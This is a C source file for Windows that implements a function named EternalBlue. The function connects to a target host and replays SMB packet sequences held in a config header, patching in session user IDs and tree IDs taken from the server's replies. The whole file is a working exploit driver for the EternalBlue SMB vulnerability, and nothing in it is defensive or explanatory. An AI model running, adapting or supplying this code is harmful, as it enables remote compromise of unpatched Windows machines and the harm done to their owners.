#include "config.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>

uint8_t *find_substring(const uint8_t *buf, size_t buf_len, const uint8_t *sub, size_t sub_len) {
    if (sub_len == 0 || sub_len > buf_len) {
        return NULL;
    }
    for (size_t i = 0; i <= buf_len - sub_len; i++) {
        if (memcmp(buf + i, sub, sub_len) == 0) {
            return (uint8_t *)(buf + i);
        }
    }
    return NULL;
}

int EternalBlue(const char *ip, int port) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return -1;
    }

    static uint16_t user_ids[NUM_SOCKETS + 1] = {0};
    static uint16_t tree_ids[NUM_SOCKETS + 1] = {0};
    SOCKET sockets[NUM_SOCKETS + 1] = {0};

    for (size_t i = 0; i < EB_OPS_COUNT; i++) {
        const eb_op_t *op = &EB_OPS[i];
        printf("Processing op %zu: kind %d, stream %d\n", i, op->kind, op->stream);

        switch (op->kind) {
            case 0: {
                if (sockets[op->stream] != INVALID_SOCKET) {
                    closesocket(sockets[op->stream]);
                    sockets[op->stream] = INVALID_SOCKET;
                }
                SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
                if (s == INVALID_SOCKET) {
                    WSACleanup();
                    return -1;
                }
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                if (InetPtonA(AF_INET, ip, &addr.sin_addr) <= 0) {
                    closesocket(s);
                    WSACleanup();
                    return -1;
                }
                addr.sin_port = htons(port);
                if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
                    closesocket(s);
                    WSACleanup();
                    return -1;
                }
                sockets[op->stream] = s;
                break;
            }
            case 1: {
                size_t offset = op->offset;
                size_t length = op->length;
                uint8_t *buf = (uint8_t *)malloc(length);
                if (!buf) {
                    WSACleanup();
                    return -1;
                }
                memcpy(buf, EB_PACKETS + offset, length);

                const char userid_placeholder_str[] = "__USERID__PLACEHOLDER__";
                size_t userid_placeholder_len = strlen(userid_placeholder_str);
                uint8_t *p_userid = find_substring(buf, length, (const uint8_t *)userid_placeholder_str, userid_placeholder_len);
                if (p_userid) {
                    uint16_t current_userid = user_ids[op->stream];
                    size_t shift = userid_placeholder_len - sizeof(current_userid);
                    memmove(p_userid + sizeof(current_userid), p_userid + userid_placeholder_len, length - (p_userid - buf + userid_placeholder_len));
                    memcpy(p_userid, &current_userid, sizeof(current_userid));
                    length -= shift;
                }

                const char treeid_placeholder_str[] = "__TREEID__PLACEHOLDER__";
                size_t treeid_placeholder_len = strlen(treeid_placeholder_str);
                uint8_t *p_treeid = find_substring(buf, length, (const uint8_t *)treeid_placeholder_str, treeid_placeholder_len);
                if (p_treeid) {
                    uint16_t current_treeid = tree_ids[op->stream];
                    size_t shift = treeid_placeholder_len - sizeof(current_treeid);
                    memmove(p_treeid + sizeof(current_treeid), p_treeid + treeid_placeholder_len, length - (p_treeid - buf + treeid_placeholder_len));
                    memcpy(p_treeid, &current_treeid, sizeof(current_treeid));
                    length -= shift;
                }

                int sent = send(sockets[op->stream], (const char *)buf, length, 0);
                if (sent == -1) {
                    free(buf);
                    WSACleanup();
                    return -1;
                }
                free(buf);
                break;
            }
            case 2: {
                uint8_t buffer[4096];
                int bytes_received = recv(sockets[op->stream], (char *)buffer, sizeof(buffer), 0);
                if (bytes_received == -1) {
                    WSACleanup();
                    return -1;
                }
                if (op->fix == 1) {
                    if (bytes_received >= 34) {
                        user_ids[op->stream] = (buffer[32] << 8) | buffer[33];
                    }
                } else if (op->fix == 2) {
                    if (bytes_received >= 30) {
                        tree_ids[op->stream] = (buffer[28] << 8) | buffer[29];
                    }
                }
                break;
            }
            case 3: {
                if (sockets[op->stream] != INVALID_SOCKET) {
                    closesocket(sockets[op->stream]);
                    sockets[op->stream] = INVALID_SOCKET;
                }
                break;
            }
        }
    }

    for (int i = 1; i <= NUM_SOCKETS; i++) {
        if (sockets[i] != INVALID_SOCKET) {
            closesocket(sockets[i]);
        }
    }

    WSACleanup();
    return 0;
}